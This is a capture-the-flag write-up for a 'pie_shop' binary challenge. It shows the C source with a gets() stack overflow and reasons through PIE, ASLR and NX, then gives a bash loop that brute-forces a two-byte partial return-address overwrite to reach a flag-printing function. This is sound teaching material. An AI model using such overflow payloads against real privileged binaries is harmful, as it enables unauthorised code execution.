## exploit
Source code:
```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void flag() {
	system("/bin/cat flag.txt");
}

void get_pie() {
	printf("What type of pie do you want? ");

	char pie[50];
	gets(pie);

	if (strcmp(pie, "apple") == 0) {
		printf("Here's your pie!\n");
		printf("      _,..---..,_\n");
		printf("  ,-\"`    .'.    `\"-,\n");
		printf(" ((      '.'.'      ))\n");
		printf("  `'-.,_   '   _,.-'`\n");
		printf("    `\\  `\"\"\"\"\"`  /`\n");
		printf("      `\"\"-----\"\"`\n");
	} else {
		printf("Whoops, looks like we're out of that one.\n");
	}
}

int main() {
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	printf("Welcome to the pie shop! Here we have all types of pies: apple pies, peach pies, blueberry pies, position independent executables, pumpkin pies, rhubarb pies...\n");
	get_pie();

	return 0;
}
```
file:

```
pie_shop: setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=9318df53faeaad841153110c8ded995df882498b, not stripped
```

checksec:
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The vulnerability was in `get_pie` function, in fact there was a `gets` that allowed to overwrite RA without any kind of checks or canary.

Ok but where to jump?

Answer this question was not easy, in fact we had:

* ASLR enabled
* PIE code 
* NX stack
* no leak avaiable

```
$ cat /proc/sys/kernel/randomize_va_space
2
```

This combination was terrible especially with PIE code:

this kind of protection maked unpredicatble where code segment were loaded and changed every time we executed binary. Of course the offsets, in the code section, remained the same. For istance we know that the offset of `flag` function ends with `1a9`, the `gets_pie` with `1bc` etc.

I explored two alternativies:

*  ### ret2vsyscall

![vmmap](https://i.ibb.co/vstZRxr/gdb-vmmap.png)
    as we can see in gdb we had vsyscall, this section load some functions at the same location without ASLR in order to speed up some system call. This could be useful in order to build some ROP chain but:

1. any attempts to jump into an arbitrary instruction inside this section cause a segfault.
    
![segfault](https://i.ibb.co/svmfLdb/gdb-crash-vsys.png|width=10)


2. the syscall inside this pages are:
        * __NR_gettimeofday
        * __NR_time
        * __NR_getcpu
        here maybe the interesting gadget could be RET but we are already able to jump at any location



*  ### partial overwrite

    The idea was to write the least significant 2 bytes of RA - in fact the offsets of instructions in code segment remained the same. Moreover I had another problem, to reach RA I needed to write `72` bytes plus `2` bytes to overwrite RA's least significant bytes, unfortunetley the len of malicious input was not multiple of 8, so a `NULL` byte was automatically appended.
    
    However:
    The goal is jump into `flag` procedure. Without overflow anything, the stack frame in `gets_pie` procedure contained RA to main procedure. So `5` of these bytes - the most significant ones - were the same as `flag` procedure, the problem was the less significant 3 bytes.
    
    Of these 3 bytes the least significant one was always `a9`, so remains 16 bit to guess and 8 of these (that i wasn't able to control) were: `0x00`. 
    
    The goal at this point was to find at least one execution that had `flag` procedure loaded into an address that ends with: `....0011a9`


```bash
for i in `seq 1 10000`; do python -c 'print "a"*72+"\xa9\x11"' | ./pie_shop 2> /dev/null | grep -i actf; done
```



##### flag: actf{a_different_kind_of_pie}



